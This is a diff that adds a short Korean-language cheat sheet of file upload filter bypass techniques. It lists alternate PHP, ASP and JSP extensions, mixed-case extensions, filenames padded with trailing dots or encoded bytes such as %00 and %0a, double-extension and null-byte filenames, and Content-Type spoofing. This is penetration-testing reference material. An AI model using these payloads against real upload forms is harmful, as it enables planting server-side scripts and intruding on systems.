@@ -1,0 +1,34 @@
+1. 확장자 우회
+
+PHP : .php , .php2 , .php3 , .php4 , .php5, .php6, .php7 , .phps , .phps , .pht , .phtm , .phtml , .pgif , .shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module
+PHPv8에서 작업 : .php , .php4 , .php5 , .phtml , .module , .inc , .hphp , .ctp
+ASP : .asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml
+Jsp:  .jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action
+
+2.대소문자 우회
+예시) php > PhP, jsp > jSP
+
+3. ascii 및 Unicode 우회
+파일.php%20
+파일.php%0a
+파일.php%00
+파일.php%0d%0a
+파일.php/
+파일.php.\
+파일.
+파일.php....
+파일.pHp5....
+
+4.null byte 우회
+파일.png.php
+파일.png.pHp5
+파일.php#.png
+파일.php%00.png
+파일.php\x00.png
+파일.php%0a.png
+파일.php%0d%0a.png
+파일.phpJunk123png
+
+5.content-type 우회
+text/plain > image/jepg
+*/* 추가
